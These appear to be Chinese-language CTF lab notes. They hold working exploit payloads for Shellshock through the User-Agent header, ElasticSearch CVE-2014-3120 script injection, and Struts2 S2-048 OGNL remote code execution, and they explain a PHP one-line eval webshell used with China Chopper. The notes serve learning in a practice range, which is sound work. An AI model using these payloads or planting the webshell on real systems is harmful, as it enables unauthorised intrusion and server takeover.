### 靶场漏洞

##### bash 命令执行 （CVE-2014-6271）
目前的Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。 影响版本：GNU Bash <= 4.3
利用过程
有两个页面http://ip:port/victim.cgi和http://ip:port/safe.cgi
访问 http://ip:port/victim.cgi，通过Burp截包修改 HTTP 请求头中User-Agent字段：
User-Agent: () { :;};echo `/bin/ls ls /tmp`" #列出tmp目录下所有文件
/bin/ls 事调用bin目录下ls事件  获取flag

ElasticSearch（CVE-2014-3120）命令执行漏洞复现
访问靶场环境，启动后可在浏览器页面成功访问
漏洞复现
用burp抓数据包
利用该漏洞之前，es至少需要存在一条数据，通过以下请求包创建数据：

1、利用POST方式提交数据
2、文件名字任意
3、浏览器的原生 form 表单，如果不设置 enctype 属性，那么其中Content-Type字段最终会以 application/x-www-form-urlencoded 方式提交数据。
而对于"application/x-www-form-urlencoded"，其参数组织形式是"键值对"。

三、利用命令执行漏洞，将一段java代码放进去
java代码：{
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {}
        }      }    },
    "script_fields": {
        "command": {
            "script":"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"ls /tmp\").getInputStream()).useDelimiter(\"\\\\A\").next();"
        }    }    }
        
其中：exec(\"ls /tmp\") 中是执行命令内容
struts2-048 远程代码执行
访问漏洞存在的路径 /integration/saveGangster.action
构建命令执行的pyload,执行命令为id
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('ls /tmp').getInputStream())).(#q)}    

其中：exec('ls /tmp') 中是执行命令内容,可查看tmp下存在的flag


### 线上靶场

通关线上靶场大多数S2和weblogic发序列化漏洞，可通过java反序列化漏洞利用工具进行测试，
瓶颈：之前不了解原因是因为，对文件存在的目录不了解，使用 pwd 命令 进行查看路径，发现都不是在根目录，通常靶场flag存在根目录下，tmp文件夹中，通关cd / 命令可以到达根目录下，之前使用命令执行时，用的都是相对路径，没有使用绝对路径进行执行，所以导致命令执行失败
问题：命令执行是把 "cd / | ls" 和 "ls | cd /"先后执行顺序弄反，导致错误的命令执行



### 一句话木马原理

一句话木马 webshell 到web服务器目录 接着权获取系统权限

基本原理利用文件上传漏洞上传webshell

 <?php @eval($_POST['pass']);?> 

--- <?php ?> --- php文件要求格式

--- @ 表示后面即使执行错误，也不报错

--- eval() 函数表示把括号内的全当代码执行

--- $_POST['pass`']`表示从页面中获得pass这个参数值。

​	php 超全局变量：`$_GET`、`$_POST`就是其中之一

​    `		$_POST['pass']`; 的意思就是pass这个变量，用post的方法接收。

​					就是来收集 请求方法为post 的名字为pass表单里面的值

​			 ---  $_POST数组获取使用POST方式提交的表单数据

​                form标签的指定该属性："method="post"。

​					就是获取表单名为pass中的表单内容

  	 比如 eval( "echo 'a' ") == echo 'a' 

​		 <?php @eval($_POST['pass']);?>   

​			首先用post请求接受变量pass  若pass = echo 'a'  

​			代码就变成了 <?php eval("echo 'a';"); ?>

所以我们可以简单的想 中国菜刀发的这么一个包 包的代码是打开指定目录的句柄，然后进行循环扫描，并附带上权限、时间、大小、日期 这个包我这里用package来代替 所以在操作的时候其实就是 key = package 然后通过eval函数执行package的php代码 从而最终达成目的
中国菜刀 发一个包，包的代码是打开目录的
